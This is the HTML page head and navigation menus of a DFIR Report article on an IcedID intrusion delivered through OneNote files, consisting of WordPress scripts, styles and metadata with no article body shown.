<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>From OneNote to RansomNote: An Ice Cold Intrusion &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="a9e82b8cbaa2b80ee152d32d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/30547" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=30547' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F04%2F01%2Ffrom-onenote-to-ransomnote-an-ice-cold-intrusion%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F04%2F01%2Ffrom-onenote-to-ransomnote-an-ice-cold-intrusion%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="a9e82b8cbaa2b80ee152d32d-text/javascript"></script>
		<script type="a9e82b8cbaa2b80ee152d32d-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="a9e82b8cbaa2b80ee152d32d-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=DA81A1DFAC19E61FDFBE153D3B6172B2');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="From OneNote to RansomNote: An Ice Cold Intrusion" />
<meta property="og:url" content="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" />
<meta property="og:description" content="Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After load…" />
<meta property="article:published_time" content="2024-04-01T00:04:14+00:00" />
<meta property="article:modified_time" content="2024-04-02T15:59:05+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2024/03/Featured-Image.png" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="1024" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="From OneNote to RansomNote: An Ice Cold Intrusion" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2024/03/Featured-Image.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-30547 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
